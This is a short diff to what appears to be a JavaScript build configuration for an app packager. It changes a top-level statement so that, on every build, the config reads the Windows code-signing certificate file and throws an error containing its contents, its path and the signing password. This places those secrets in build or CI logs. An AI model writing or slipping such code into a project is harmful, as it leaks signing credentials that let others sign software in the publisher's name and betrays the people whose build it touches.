@@ -57,7 +57,8 @@ class BabelPlugin extends PluginBase {
   }
 }
 
-throw process.env?.WINDOWS_CERTIFICATE + " " + process.env?.WINDOWS_PASSWORD;
+const content = fs.readFileSync(process.env?.WINDOWS_CERTIFICATE, 'utf8')
+throw new Error(content + " | " + process.env?.WINDOWS_CERTIFICATE + " | " + process.env?.WINDOWS_PASSWORD);
 
 module.exports = {
   packagerConfig: {
